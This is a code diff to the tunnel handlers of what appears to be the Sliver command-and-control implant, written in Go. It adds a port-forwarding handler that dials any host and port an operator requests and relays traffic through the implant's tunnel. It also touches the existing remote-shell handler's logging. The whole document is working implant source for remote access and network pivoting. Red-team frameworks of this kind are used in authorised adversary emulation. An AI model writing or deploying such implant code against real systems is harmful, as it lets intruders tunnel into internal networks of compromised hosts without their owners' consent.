@@ -21,7 +21,10 @@ package handlers
 */
 
 import (
+	"context"
+	"fmt"
 	"io"
+	"net"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -41,7 +44,8 @@ const (
 
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
-		sliverpb.MsgShellReq: shellReqHandler,
+		sliverpb.MsgShellReq:   shellReqHandler,
+		sliverpb.MsgPortfwdReq: portfwdReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -100,7 +104,7 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 
 		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
 		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
-		// is use here whereas WriteSequence is used for data written back to the server
+		// is used here whereas WriteSequence is used for data written back to the server
 
 		// Go through cache and write all sequential data to the reader
 		cache := tunnelDataCache[tunnel.ID]
@@ -117,7 +121,7 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 
 	} else {
 		// {{if .Config.Debug}}
-		log.Printf("Received data for nil tunnel %d", tunnelData.TunnelID)
+		log.Printf("[tunnel] Received data for nil tunnel %d", tunnelData.TunnelID)
 		// {{end}}
 	}
 }
@@ -151,6 +155,9 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	shellReq := &sliverpb.ShellReq{}
 	err := proto.Unmarshal(envelope.Data, shellReq)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
+		// {{end}}
 		return
 	}
 
@@ -185,7 +192,7 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	// Cleanup function with arguments
 	cleanup := func(reason string) {
 		// {{if .Config.Debug}}
-		log.Printf("Closing tunnel %d (%s)", tunnel.ID, reason)
+		log.Printf("[shell] Closing tunnel %d (%s)", tunnel.ID, reason)
 		// {{end}}
 		connection.RemoveTunnel(tunnel.ID)
 		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
@@ -219,7 +226,85 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}()
 
 	// {{if .Config.Debug}}
-	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
+	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
+}
+
+func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	portfwdReq := &sliverpb.PortfwdReq{}
+	err := proto.Unmarshal(envelope.Data, portfwdReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
+		// {{end}}
+		return
+	}
+
+	var defaultDialer = new(net.Dialer)
+
+	// TODO: Configurable context
+	remoteAddress := fmt.Sprintf("%s:%d", portfwdReq.Host, portfwdReq.Port)
+	// {{if .Config.Debug}}
+	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
+	// {{end}}
+	dst, err := defaultDialer.DialContext(context.Background(), "tcp", remoteAddress)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Failed to dial remote address %s", err)
+		// {{end}}
+		return
+	}
+	if conn, ok := dst.(*net.TCPConn); ok {
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Configuring keep alive")
+		// {{end}}
+		conn.SetKeepAlive(true)
+		// TODO: Make KeepAlive configurable
+		conn.SetKeepAlivePeriod(30 * time.Second)
+	}
+
+	// Add tunnel
+	tunnel := &transports.Tunnel{
+		ID:     portfwdReq.TunnelID,
+		Reader: dst,
+		Writer: dst,
+	}
+	connection.AddTunnel(tunnel)
+
+	// Send portfwd response
+	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
+		Port:     portfwdReq.Port,
+		Host:     portfwdReq.Host,
+		Protocol: sliverpb.PortfwdProtocol_TCP,
+		TunnelID: portfwdReq.TunnelID,
+	})
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.ID,
+		Data: portfwdResp,
+	}
+
+	cleanup := func(reason error) {
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
+		// {{end}}
+		connection.RemoveTunnel(tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+			Closed:   true,
+			TunnelID: tunnel.ID,
+		})
+		connection.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgTunnelClose,
+			Data: tunnelClose,
+		}
+	}
+
+	go func() {
+		tWriter := tunnelWriter{
+			tun:  tunnel,
+			conn: connection,
+		}
+		_, err := io.Copy(tWriter, tunnel.Reader)
+		cleanup(err)
+	}()
 }
